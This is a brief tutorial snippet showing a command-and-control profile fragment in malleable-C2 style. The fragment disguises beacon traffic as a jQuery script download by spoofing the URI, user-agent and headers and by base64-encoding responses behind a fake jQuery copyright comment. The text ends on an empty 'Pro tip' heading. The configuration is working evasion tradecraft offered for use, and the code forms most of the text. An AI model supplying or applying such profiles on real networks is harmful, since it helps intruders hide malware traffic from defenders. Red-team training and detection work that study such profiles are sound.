Code Concept

Shaping requests to look benign

Adjust URI, user-agent, headers, and output encoding so beacon traffic resembles normal web asset retrievals.

http-get {
    set uri "/jquery-3.5.1.min.js";
    set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
    set header "Accept" "*/*";

    output {
        base64;
        prepend "/* jQuery v3.5.1 | (c) JS Foundation */";
        header "Content-Type" "application/javascript";
    }
}
This conceptual snippet disguises beacon responses as a legitimate script download. Notice how output encoding and a familiar prefix reduce obvious signatures.

Pro tip
